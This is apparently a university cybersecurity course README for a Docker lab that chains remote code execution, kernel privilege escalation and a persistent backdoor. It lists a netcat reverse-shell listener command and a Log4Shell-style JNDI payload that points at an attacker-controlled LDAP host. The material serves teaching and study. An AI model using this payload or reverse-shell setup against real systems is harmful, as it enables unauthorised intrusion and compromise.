# A Practical Demonstration of an Exploitation Chain: From Remote Code Execution to Full System Compromise

## Project Overview

This project is developed as part of the **Cybersecurity** course at the **University of Messina**.  
It presents a practical demonstration of an exploitation chain involving:

- **Remote Code Execution (RCE)** via a vulnerable web application
- **Privilege Escalation** through kernel-level exploitation
- **Installation of a persistent backdoor** for post-exploitation access

## Requirements

- **Linux Kernel 5.8.x**  
  (Tested with `5.10.0-19`, default in Ubuntu 21.04)
  You can use `name -r` to check your kernel version
- **Docker** and **Docker Compose**

---

##  Quick Start

### 1. Clone the Repository
```bash
git clone https://github.com/your-username/rce-to-full-compromise-demo.git
cd rce-to-full-compromise-demo
```
### 2. Build and Start the Environment
```bash
docker-compose up --build
```
This will build all containers (attacker, backend, and database) and start the application

### 3. Access the Target Web
Through your browser visit:
```
http://localhost:8080/
```
% This interface contains a vulnerable component through which
% the initial Remote Code Execution (RCE) is performed.
%
### 4. Set Up the Attacker Listener
In a new terminal, open a shell inside the attacker container
```bash
docker exec -it attacker bash
```
Start a Netcat listener to wait for the reverse shell:
```bash
nc -lp 6666
```

This listen for the reverse shell triggered by the exploit.
### Start the Exploit via Web Interface
Using the vulnerable form on the frontend site submit the payload `${jndi:ldap://attacker:1389/Exploit}`
